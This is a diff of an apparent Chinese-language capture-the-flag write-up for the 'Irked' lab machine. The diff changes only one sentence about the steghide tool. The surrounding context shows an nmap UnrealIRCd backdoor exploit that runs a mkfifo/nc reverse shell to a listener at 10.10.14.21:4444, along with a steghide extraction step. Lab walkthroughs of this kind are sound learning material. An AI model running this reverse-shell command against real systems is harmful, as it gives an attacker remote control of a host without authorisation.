@@ -198,7 +198,7 @@ function sidebar_toggle() {
 <pre class="language-bash" data-language="bash"><code class="language-bash">nmap -d -p6697 --script<span class="token operator">=</span>irc-unrealircd-backdoor.nse --script-args<span class="token operator">=</span>irc-unrealircd-backdoor.command<span class="token operator">=</span><span class="token string">'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&amp;1|nc 10.10.14.21 4444 >/tmp/f &amp;'</span> <span class="token number">10.10</span>.10.117</code></pre>
 <p><img src="./6.png" alt=""><br>
 <code>ircd</code> 并没有 user flag，找到 <code>djmardov</code> 用户 <code>./documents</code>，无权限打开 <code>user.txt</code>，看了 <code>sudo -l</code> 没有可以切换的姿势，在 documents 下 <code>ls -la</code> 发现隐藏文件 <code>.backup，cat</code> 一下是一个 <code>xxx step backup pw</code>，像是某个密码，用来 <code>ssh djmardov@10.10.10.117</code> 不对，于是 google 一下发现跟 <code>stephide</code> 这个工具有关。<br>
-<code>stephide</code> 是用于将文件隐藏在图片、音频的一种姿势，</p>
+<code>stephide</code> 是用于将<strong>文件隐藏在图片、音频</strong>的工具。</p>
 <pre class="language-bash" data-language="bash"><code class="language-bash">stephide extract -sf irked.jpg -p password  <span class="token comment"># 提取文件</span>
 steghide embed -ef secret.txt -cf irked.jpg <span class="token comment"># 隐藏文件</span>
 <span class="token comment"># 会被提示输入口令</span>
